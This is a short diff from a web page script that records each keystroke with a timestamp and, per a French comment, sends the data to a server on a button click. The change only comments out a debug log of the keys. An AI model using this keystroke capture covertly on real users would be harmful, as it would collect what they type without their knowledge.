@@ -25,7 +25,7 @@ document.addEventListener("DOMContentLoaded", () => {
         };
 
         keystrokes.push(keyData);
-        console.log(`Key: ${event.key}, Timestamp: ${timestamp}`);
+        // console.log(`DEBUG: Key: ${event.key}, Timestamp: ${timestamp}`);
     });
 
     // Envoyer les données au serveur lorsque le bouton est cliqué
